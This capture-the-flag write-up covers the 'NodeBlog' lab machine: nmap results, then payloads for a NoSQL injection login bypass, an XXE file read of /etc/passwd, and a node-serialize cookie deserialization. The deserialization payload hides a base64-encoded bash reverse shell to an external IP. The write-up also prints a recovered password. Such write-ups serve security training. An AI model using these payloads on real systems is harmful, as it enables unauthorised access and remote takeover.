# NodeBlog

---

## Enumeration

- nmap:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)
|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)
|_  256 2221e9f485908745161f733641ee3b32 (ED25519)
5000/tcp open  http    Node.js (Express middleware)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

## Foothold

- Login is vulnerable to NoSQL Injection, request body:

```json
{
	"user":"admin",
	"password": {
		"$ne": "anything"
	}
}
```

- Upload XML is vulnerable to XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>

<post>
<title>
	&file;
</title>
<description>
	Test
</description>
<markdown>
	Test
</markdown>
</post>
```

- Got `/opt/blog/server.js`
- Deserialization Attack: on cookie `auth=`:

```json
{"game":"_$$ND_FUNC$$_function(){require('child_process').exec('echo \"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zLzkwMDAgMD4mMQ==\" | base64 -d | bash', function(error, stdout, stderr){console.log(stdout)});}()"}
```



---

## PrivEsc

- mongo, use blog, db.users.find()
- password is: `IppsecSaysPleaseSubscribe`
- just `sudo su` as root.

---

